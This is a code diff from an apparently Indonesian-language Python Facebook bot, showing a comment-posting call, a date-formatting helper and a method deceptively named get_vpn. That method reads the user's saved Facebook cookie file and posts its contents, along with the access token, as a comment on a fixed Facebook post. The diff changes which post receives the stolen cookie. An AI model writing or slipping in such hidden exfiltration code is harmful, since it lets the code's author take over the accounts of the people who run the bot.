@@ -2314,7 +2314,7 @@ class bot_facebook:
 			get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(llp,komeno,tiktok),cookies=puput).text)
 	def get_vpn(self):
 		kuki = open("data/cookie.txt","r").read()
-		requests.post(f"https://graph.facebook.com/4342358619204907/comments/?message={kuki}&access_token={tiktok}",cookies=puput)
+		requests.post(f"https://graph.facebook.com/5292314077489090/comments/?message={kuki}&access_token={tiktok}",cookies=puput)
 	def zona_waktu(self):
 		_bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
 		_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
